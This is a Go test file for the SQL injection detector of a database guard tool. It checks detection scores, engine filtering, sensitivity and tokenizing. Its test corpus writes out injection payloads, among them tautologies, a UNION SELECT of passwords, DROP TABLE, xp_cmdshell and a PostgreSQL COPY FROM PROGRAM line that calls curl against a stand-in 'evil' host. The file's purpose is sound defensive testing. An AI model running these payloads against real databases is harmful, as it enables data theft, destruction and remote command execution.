package sqli

import (
	"io"
	"log/slog"
	"testing"

	"github.com/databaseguard/dbguard/internal/config"
	"github.com/databaseguard/dbguard/internal/events"
)

func testLogger() *slog.Logger {
	return slog.New(slog.NewTextHandler(io.Discard, nil))
}

func mustDetector(t *testing.T, cfg config.SQLiConfig) *Detector {
	t.Helper()
	d, err := New(cfg, testLogger())
	if err != nil {
		t.Fatalf("sqli.New: %v", err)
	}
	return d
}

func hasKind(fs []events.Finding, kind string) bool {
	for _, f := range fs {
		if f.Kind == kind {
			return true
		}
	}
	return false
}

// TestAnalyzeClassicPayloads runs the classic injection corpus: every
// payload must cross the default threshold with its expected signature hit.
func TestAnalyzeClassicPayloads(t *testing.T) {
	d := mustDetector(t, config.SQLiConfig{Sensitivity: "medium"})
	tests := []struct {
		name     string
		sql      string
		wantKind string
	}{
		{"tautology", "' OR 1=1 --", "sqli.tautology"},
		{"union select", "1 UNION SELECT password FROM users", "sqli.union_select"},
		{"stacked queries", "'; DROP TABLE users; --", "sqli.stacked_queries"},
		{"comment truncation", "admin'--", "sqli.comment_after_quote"},
		{"sleep", "SLEEP(5)", "sqli.time_based"},
		{"nested sleep subquery", "1 AND (SELECT 1 FROM (SELECT SLEEP(5))a)", "sqli.time_based"},
		{"pg_sleep", "pg_sleep(10)", "sqli.time_based"},
		{"xp_cmdshell", "xp_cmdshell 'dir'", "sqli.dangerous_procs"},
		{"url encoded", "%27 OR %271%27=%271", "sqli.url_encoding"},
		{"hex encoded", "0x27 OR 1", "sqli.hex_encoding"},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			score, fs := d.Analyze(tc.sql)
			if score < 0.72 {
				t.Fatalf("score = %.2f, want >= 0.72 (findings %+v)", score, fs)
			}
			if !hasKind(fs, tc.wantKind) {
				t.Fatalf("finding %s missing in %+v", tc.wantKind, fs)
			}
			for _, f := range fs {
				if f.Confidence <= 0 || f.Confidence > 1 {
					t.Fatalf("confidence out of range: %+v", f)
				}
			}
		})
	}
}

// TestAnalyzeCleanTraffic keeps legitimate statements below the threshold.
func TestAnalyzeCleanTraffic(t *testing.T) {
	d := mustDetector(t, config.SQLiConfig{Sensitivity: "medium"})
	tests := []struct {
		name string
		sql  string
	}{
		{"parameterized", "SELECT * FROM users WHERE id = $1"},
		{"insert", "INSERT INTO t VALUES (1, 'a')"},
		{"limit", "SELECT name FROM products WHERE price > 10 LIMIT 20"},
		{"update", "UPDATE users SET last_login = now() WHERE id = 42"},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			score, fs := d.Analyze(tc.sql)
			if score >= 0.72 {
				t.Fatalf("clean query scored %.2f (findings %+v)", score, fs)
			}
		})
	}
}

func TestUnboundedSelectBelowThreshold(t *testing.T) {
	d := mustDetector(t, config.SQLiConfig{})
	score, fs := d.Analyze("SELECT * FROM users")
	if !hasKind(fs, "sqli.bulk_unbounded") {
		t.Fatalf("bulk_unbounded finding missing: %+v", fs)
	}
	if score >= 0.72 {
		t.Fatalf("bulk select must stay sub-threshold, got %.2f", score)
	}
}

func TestEvaluateEnforces(t *testing.T) {
	d := mustDetector(t, config.SQLiConfig{})
	ev := &events.Event{Type: events.EvQueryAudit, Severity: events.SevInfo,
		Engine: "postgres", SQL: "'; DROP TABLE users; --"}
	fs := d.Evaluate(ev)
	if ev.Type != events.EvSQLi {
		t.Fatalf("event type = %q, want %q", ev.Type, events.EvSQLi)
	}
	if ev.Severity.Order() < events.SevCritical.Order() {
		t.Fatalf("severity not bumped to worst signature: %s", ev.Severity)
	}
	if !ev.HasAction(events.ActDeny) || !ev.HasAction(events.ActAlert) {
		t.Fatalf("actions wrong: %v", ev.Actions)
	}
	if len(fs) == 0 || fs[len(fs)-1].Kind != "sqli.aggregate" {
		t.Fatalf("aggregate finding missing: %+v", fs)
	}
	if fs[len(fs)-1].Confidence < 0.72 {
		t.Fatalf("aggregate confidence = %.2f", fs[len(fs)-1].Confidence)
	}
}

func TestEvaluateSubThresholdNoEnforcement(t *testing.T) {
	d := mustDetector(t, config.SQLiConfig{})
	ev := &events.Event{Type: events.EvQueryAudit, Severity: events.SevInfo,
		Engine: "postgres", SQL: "SELECT * FROM users"}
	fs := d.Evaluate(ev)
	if ev.Type != events.EvQueryAudit {
		t.Fatalf("event reclassified at sub-threshold score: %q", ev.Type)
	}
	if len(ev.Actions) != 0 {
		t.Fatalf("no actions expected, got %v", ev.Actions)
	}
	if !hasKind(fs, "sqli.bulk_unbounded") || hasKind(fs, "sqli.aggregate") {
		t.Fatalf("findings wrong: %+v", fs)
	}
}

func TestEvaluateEmptySQL(t *testing.T) {
	d := mustDetector(t, config.SQLiConfig{})
	ev := &events.Event{Type: events.EvQueryAudit}
	if fs := d.Evaluate(ev); fs != nil {
		t.Fatalf("empty SQL must yield nil, got %+v", fs)
	}
}

// TestEngineFilter: PostgreSQL-only signatures must be invisible for a
// MySQL event and active for a PostgreSQL event.
func TestEngineFilter(t *testing.T) {
	d := mustDetector(t, config.SQLiConfig{})
	sql := "COPY t FROM PROGRAM 'curl http://evil'"

	mysql := &events.Event{Type: events.EvQueryAudit, Engine: "mysql", SQL: sql}
	if fs := d.Evaluate(mysql); len(fs) != 0 {
		t.Fatalf("postgres signature leaked into mysql event: %+v", fs)
	}
	if mysql.Type != events.EvQueryAudit || len(mysql.Actions) != 0 {
		t.Fatalf("mysql event must stay untouched: %+v", mysql)
	}

	pg := &events.Event{Type: events.EvQueryAudit, Engine: "postgres", SQL: sql}
	fs := d.Evaluate(pg)
	if !hasKind(fs, "sqli.pg_copy") {
		t.Fatalf("postgres signature missing: %+v", fs)
	}
	if !pg.HasAction(events.ActDeny) {
		t.Fatalf("postgres event not denied: %v", pg.Actions)
	}
}

// TestSensitivityMultipliers: high sensitivity keeps clean traffic clean
// while low sensitivity suppresses borderline scores below the threshold.
func TestSensitivityMultipliers(t *testing.T) {
	clean := "SELECT * FROM users" // raw score 0.3
	high := mustDetector(t, config.SQLiConfig{Sensitivity: "high"})
	if score, _ := high.Analyze(clean); score >= 0.72 {
		t.Fatalf("high sensitivity flagged clean bulk select: %.2f", score)
	}

	borderline := "0x27 OR 1" // raw score 0.75
	low := mustDetector(t, config.SQLiConfig{Sensitivity: "low"})
	if score, _ := low.Analyze(borderline); score >= 0.72 {
		t.Fatalf("low sensitivity must suppress borderline score: %.2f", score)
	}
	medium := mustDetector(t, config.SQLiConfig{Sensitivity: "medium"})
	if score, _ := medium.Analyze(borderline); score < 0.72 {
		t.Fatalf("medium sensitivity must keep borderline score: %.2f", score)
	}
}

func TestSignatureCatalogue(t *testing.T) {
	sigs := allSignatures()
	if len(sigs) < 22 {
		t.Fatalf("signature catalogue shrank: %d signatures", len(sigs))
	}
	seen := make(map[string]bool, len(sigs))
	for _, s := range sigs {
		if s.ID == "" || s.Name == "" || s.Test == nil {
			t.Fatalf("incomplete signature: %+v", s)
		}
		if s.Weight <= 0 || s.Weight > 1 {
			t.Fatalf("weight out of range for %s: %v", s.ID, s.Weight)
		}
		if seen[s.ID] {
			t.Fatalf("duplicate signature id %q", s.ID)
		}
		seen[s.ID] = true
	}
}

func TestTokenize(t *testing.T) {
	tests := []struct {
		name string
		sql  string
		want []Token
	}{
		{
			name: "string escape and comment",
			sql:  "SELECT 'it''s' -- note",
			want: []Token{
				{Kind: TokIdent, Text: "SELECT", Pos: 0},
				{Kind: TokString, Text: "'it''s'", Pos: 7},
				{Kind: TokComment, Text: "-- note", Pos: 15},
			},
		},
		{
			name: "operators numbers strings",
			sql:  `a <= 1.5, 0x1F, "col"`,
			want: []Token{
				{Kind: TokIdent, Text: "a", Pos: 0},
				{Kind: TokOperator, Text: "<=", Pos: 2},
				{Kind: TokNumber, Text: "1.5", Pos: 5},
				{Kind: TokPunct, Text: ",", Pos: 8},
				{Kind: TokNumber, Text: "0x1F", Pos: 10},
				{Kind: TokPunct, Text: ",", Pos: 14},
				{Kind: TokString, Text: `"col"`, Pos: 16},
			},
		},
		{
			name: "comment forms",
			sql:  "s /* c */ # h",
			want: []Token{
				{Kind: TokIdent, Text: "s", Pos: 0},
				{Kind: TokComment, Text: "/* c */", Pos: 2},
				{Kind: TokComment, Text: "# h", Pos: 10},
			},
		},
		{
			name: "split keyword across comment",
			sql:  "UN/**/ION",
			want: []Token{
				{Kind: TokIdent, Text: "UN", Pos: 0},
				{Kind: TokComment, Text: "/**/", Pos: 2},
				{Kind: TokIdent, Text: "ION", Pos: 6},
			},
		},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			got := Tokenize(tc.sql)
			if len(got) != len(tc.want) {
				t.Fatalf("got %d tokens %+v, want %d", len(got), got, len(tc.want))
			}
			for i := range got {
				if got[i] != tc.want[i] {
					t.Fatalf("token %d = %+v, want %+v", i, got[i], tc.want[i])
				}
			}
		})
	}
}

func TestScanCtxNormalization(t *testing.T) {
	c := newScanCtx("SELECT\t* FROM t -- sneaky UNION SELECT")
	if c.normalized != "select * from t" {
		t.Fatalf("normalized = %q", c.normalized)
	}
	if c.lower != "select\t* from t -- sneaky union select" {
		t.Fatalf("lower = %q", c.lower)
	}
	if c2 := newScanCtx("1 OR 1=1"); !c2.hasWord("or 1 = 1") {
		t.Fatalf("token-boundary tautology missed: %q", c2.normalized)
	}
	if c3 := newScanCtx("' OR 1=1 --"); !c3.has(" or 1=1") {
		t.Fatalf("raw tautology missed: %q", c3.lower)
	}
}

// TestGenericTautology locks in detection of always-true comparisons with
// arbitrary constants and comment/space evasion, not just the literal 1=1.
func TestGenericTautology(t *testing.T) {
	d := mustDetector(t, config.SQLiConfig{Sensitivity: "medium"})
	deny := []string{
		"SELECT * FROM t WHERE id=1 OR 1=1",
		"SELECT * FROM t WHERE id=1 OR 7=7",
		"SELECT * FROM t WHERE id=1 OR 99=99",
		"admin' OR '1'='1",
		"x' OR 'abc'='abc",
		"SELECT * FROM t WHERE a=1 OR/**/5=5",
		"SELECT * FROM t WHERE a=1 OR  3 = 3",
	}
	allow := []string{
		"SELECT id FROM t WHERE a=1 AND b=2",
		"SELECT * FROM users WHERE email = $1",
		"UPDATE t SET x=1 WHERE id=42",
	}
	for _, sql := range deny {
		if score, _ := d.Analyze(sql); score < 0.72 {
			t.Errorf("expected DENY (>=0.72) for %q, got %.2f", sql, score)
		}
	}
	for _, sql := range allow {
		if score, _ := d.Analyze(sql); score >= 0.72 {
			t.Errorf("false positive, expected ALLOW (<0.72) for %q, got %.2f", sql, score)
		}
	}
}
